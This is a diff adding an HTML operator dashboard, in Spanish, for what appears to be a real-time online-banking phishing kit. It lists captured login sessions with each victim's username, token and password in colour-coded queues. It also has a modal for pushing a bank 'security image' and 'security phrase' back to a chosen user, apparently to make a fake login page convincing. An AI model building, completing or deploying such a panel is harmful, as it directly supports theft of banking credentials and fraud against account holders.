@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <title>Panel e-banca — operador</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="theme-color" content="#353131" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/panel.css" />
+  <link rel="stylesheet" href="css/ba-extra.css" />
+</head>
+<body>
+  <div class="gate" id="panelGate" hidden>
+    <form class="gate__card" id="panelGateForm" autocomplete="off">
+      <h1 class="gate__title">Panel e-banca</h1>
+      <p class="gate__sub">Ingresa la clave de acceso</p>
+      <label class="gate__label">
+        <span>Clave</span>
+        <input
+          id="panelGateInput"
+          type="password"
+          name="panel_key"
+          required
+          autofocus
+          autocomplete="current-password"
+        />
+      </label>
+      <p class="gate__error" id="panelGateError" hidden>Clave incorrecta</p>
+      <button type="submit" class="btn btn--ok gate__btn">Entrar</button>
+    </form>
+  </div>
+
+  <main class="dash" id="panelDash" hidden>
+    <header class="toolbar">
+      <div class="toolbar__left">
+        <h1 class="toolbar__title">Panel e-banca</h1>
+        <span class="toolbar__meta">Sesiones: <strong id="rowCount">0</strong> · envía imagen y frase de seguridad</span>
+      </div>
+      <div class="toolbar__actions">
+        <button type="button" class="btn btn--ok" id="btnClean">Limpiar</button>
+        <a class="btn btn--ghost" href="/login" target="_blank" rel="noopener">Ir al login</a>
+      </div>
+    </header>
+
+    <p class="empty is-visible" id="emptyState">
+      Cola vacía. Cuando un usuario pulse Continuar en el login, aparece aquí.
+    </p>
+
+    <div class="sections" id="sections">
+      <section class="lane lane--1" data-lane="0">
+        <div class="lane__head">
+          <span class="lane__title">Azul</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Dispositivo</th>
+              <th>Usuario</th>
+              <th>Token</th>
+              <th>Clave</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Envío</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="0"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--2" data-lane="1">
+        <div class="lane__head">
+          <span class="lane__title">Verde</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Dispositivo</th>
+              <th>Usuario</th>
+              <th>Token</th>
+              <th>Clave</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Envío</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="1"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--3" data-lane="2">
+        <div class="lane__head">
+          <span class="lane__title">Rojo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Dispositivo</th>
+              <th>Usuario</th>
+              <th>Token</th>
+              <th>Clave</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Envío</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="2"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--4" data-lane="3">
+        <div class="lane__head">
+          <span class="lane__title">Gris</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Dispositivo</th>
+              <th>Usuario</th>
+              <th>Token</th>
+              <th>Clave</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Envío</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="3"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--5" data-lane="4">
+        <div class="lane__head">
+          <span class="lane__title">Amarillo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Dispositivo</th>
+              <th>Usuario</th>
+              <th>Token</th>
+              <th>Clave</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Envío</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="4"></tbody>
+        </table>
+      </section>
+    </div>
+
+    <p class="footer-note" id="hint">
+      En Acciones: pulsa Enviar imagen para abrir el envío (arrastrar / pegar).
+    </p>
+  </main>
+
+  <div class="modal" id="imagenModal" hidden>
+    <div class="modal__backdrop" data-modal-close></div>
+    <div class="modal__card" role="dialog" aria-modal="true" aria-labelledby="imagenModalTitle">
+      <header class="modal__head">
+        <h2 id="imagenModalTitle">Enviar imagen de seguridad</h2>
+        <button type="button" class="modal__x" data-modal-close aria-label="Cerrar">×</button>
+      </header>
+      <p class="modal__user">Usuario: <strong id="modalUser">—</strong></p>
+
+      <div
+        class="dropzone"
+        id="dropzone"
+        tabindex="0"
+        title="Arrastra una imagen o pega con Ctrl+V"
+      >
+        <img class="dropzone__preview" id="modalPreview" alt="" hidden />
+        <div class="dropzone__hint" id="dropzoneHint">
+          <strong>Arrastra</strong> la imagen aquí<br />
+          o <strong>pega</strong> con Ctrl+V / Cmd+V
+        </div>
+        <input type="file" id="modalFile" accept="image/*" hidden />
+        <button type="button" class="btn btn--ghost dropzone__pick" id="btnPickFile">
+          Elegir archivo…
+        </button>
+      </div>
+
+      <label class="modal__label" for="modalPhrase">Frase de seguridad</label>
+      <input
+        type="text"
+        id="modalPhrase"
+        class="modal__phrase"
+        placeholder="Escribe o pega la frase"
+        maxlength="80"
+        autocomplete="off"
+      />
+
+      <footer class="modal__actions">
+        <button type="button" class="btn btn--ghost" data-modal-close>Cancelar</button>
+        <button type="button" class="btn btn--ok" id="btnConfirmImagen">Confirmar envío</button>
+      </footer>
+    </div>
+  </div>
+
+  <script src="js/panel.js"></script>
+</body>
+</html>
